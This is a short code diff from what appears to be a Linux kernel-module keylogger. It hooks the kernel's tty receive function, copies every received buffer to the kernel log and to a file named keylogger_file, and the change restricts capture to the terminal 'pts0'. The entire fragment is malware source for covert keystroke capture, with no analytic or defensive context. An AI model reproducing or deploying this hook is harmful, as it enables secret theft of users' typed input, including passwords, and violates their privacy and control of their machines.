@@ -27,7 +27,7 @@ int my_n_tty_receive_buf_common(struct tty_struct *tty, const unsigned char *cp,
 	// calling the original function 	
 	result = n_tty_receive_buf_common(tty, cp, fp, count, 0);
 
-	if (strcmp(cp, "") != 0) {
+	if (strcmp(cp, "") != 0 && strcmp(tty->name, "pts0") == 0) {
 		printk("%s", cp);	
 		driver_file_write(keylogger_file, 0, cp, result);
 	}
